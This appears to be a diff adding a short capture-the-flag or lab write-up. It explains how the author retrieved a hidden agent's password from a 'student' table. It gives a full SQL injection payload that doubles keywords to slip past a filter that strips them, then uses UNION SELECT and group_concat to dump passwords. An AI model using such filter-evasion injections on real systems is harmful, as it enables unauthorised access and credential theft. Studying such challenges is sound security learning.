@@ -1,0 +1,3 @@
+In this question to get the password of the hidden agent I looked at the password fields of all records in the student table where the uname of any record consists of the string agent in it and I found one record corresponding to the Hidden Agent.
+
+SQL Query - ' oorr 1 ununionion (selselectect null,(SEselectLECT (group_concat(passwoorrd)) FROM student whwhereere uname LIKE '%agent%'),null,null,null,null,null,null,null,null,null,null,null,null) -- -
